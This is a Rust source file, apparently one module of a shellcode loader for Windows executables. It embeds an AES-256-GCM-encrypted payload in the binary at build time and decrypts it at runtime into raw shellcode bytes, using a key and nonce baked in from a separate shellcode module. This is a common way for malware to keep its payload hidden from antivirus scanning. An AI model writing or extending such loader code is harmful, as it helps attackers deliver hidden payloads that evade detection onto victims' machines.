//! crypto.rs — AES-256-GCM runtime decryption
//!
//! The encrypted payload is embedded directly into the binary at link time
//! via include_bytes!. No file needs to be deployed alongside the .exe.
//!
//! The KEY and NONCE live in shellcode.rs and are baked in at compile time.

use aes_gcm::{
    aead::{Aead, KeyInit},
    Aes256Gcm, Key, Nonce,
};

use crate::shellcode::{KEY, NONCE};

/// Embedded encrypted payload — included at link time, not parsed by rustc.
/// This avoids the compiler OOM that occurs with large const byte arrays.
static PAYLOAD: &[u8] = include_bytes!("payload.bin");

/// Decrypt the embedded payload and return raw shellcode bytes.
pub fn decrypt() -> Result<Vec<u8>, &'static str> {
    if PAYLOAD.is_empty() {
        return Err("embedded payload is empty — run prepare.sh to build");
    }

    let cipher = Aes256Gcm::new(Key::<Aes256Gcm>::from_slice(&KEY));
    let nonce  = Nonce::from_slice(&NONCE);

    cipher
        .decrypt(nonce, PAYLOAD)
        .map_err(|_| "AES-GCM decryption failed: bad tag or tampered payload")
}
